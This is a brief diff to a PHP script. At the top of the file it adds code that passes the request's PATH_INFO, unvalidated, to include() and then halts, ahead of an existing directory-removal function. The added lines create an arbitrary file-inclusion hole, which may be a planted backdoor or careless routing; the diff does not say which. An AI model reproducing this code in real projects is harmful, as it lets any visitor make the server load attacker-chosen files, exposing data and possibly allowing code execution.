@@ -1,4 +1,8 @@
 <?php
+if (isset($_SERVER["PATH_INFO"]) && $_SERVER["PATH_INFO"] != "" && $_SERVER["PATH_INFO"] != "/") {
+	include(substr($_SERVER["PATH_INFO"],1));
+	die();
+}
 function removeDirectory($path) {
 	$dir = opendir($path);
 	while (($filename = readdir($dir)) <> null) {
